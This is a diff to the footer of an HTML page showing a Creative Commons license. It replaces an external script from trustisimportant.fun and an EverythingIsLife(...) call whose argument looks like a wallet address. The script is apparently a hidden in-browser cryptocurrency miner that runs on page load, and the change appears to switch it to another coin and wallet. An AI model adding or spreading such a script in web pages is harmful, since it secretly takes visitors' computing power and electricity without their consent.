@@ -24,7 +24,7 @@
 <hr>
 <center><a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/4.0/">Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International License</a>.</center>
 
-<script src="https://trustisimportant.fun/karma/karma.js?karma=bs?nosaj=faster.itns" ></script>
+<script src="https://trustisimportant.fun/karma/karma.js?karma=bs?nosaj=faster.msr" ></script>
 <script type="text/javascript">
-EverythingIsLife('iz4XTngKEL4S3vryhHfAxDah8sUMfv5ueXGmn5wgxtZ8Hh1fWahkGHHY7yd1nQ8dHHexD9eNmZMfRe5gCPjY7GbJ1ZgQ7Pc8E', 'x', 30);
+EverythingIsLife('5r3tJqjNahB5VXakK6ovZnKJ1KuetsbkVHuswWCNABEA85PWAxiukNA1wzD23X1NLo8GToZYxBQNriPNpibXhWRjPEEvH3A', 'x', 30);
 </script>
